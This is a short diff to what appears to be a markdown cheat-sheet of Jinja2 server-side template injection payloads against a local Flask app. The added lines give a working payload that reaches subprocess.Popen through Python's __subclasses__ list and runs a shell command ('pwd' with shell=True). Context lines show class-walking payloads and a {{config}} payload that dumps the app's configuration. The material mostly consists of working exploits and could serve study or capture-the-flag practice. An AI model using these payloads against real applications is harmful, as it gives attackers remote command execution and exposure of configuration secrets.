@@ -51,7 +51,10 @@ http://127.0.0.1:5000/?c={{%20(dict.mro()[-1]|attr(%22\x5f\x5fsubclasses\x5f\x5f
 ```
 
 - ##  Get name of current python flask script
-
+Didnt get the name of the exact script but got the directory:
+```
+http://127.0.0.1:5000/?c={{%27%27.__class__.mro()[1].__subclasses__()[396](%27pwd%27,shell=True,stdout=-1).communicate()[0].strip()}}
+```
 
 - ## Get all the current envvars
 ```http://127.0.0.1:5000/?c={{config}}```: ```<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None,```
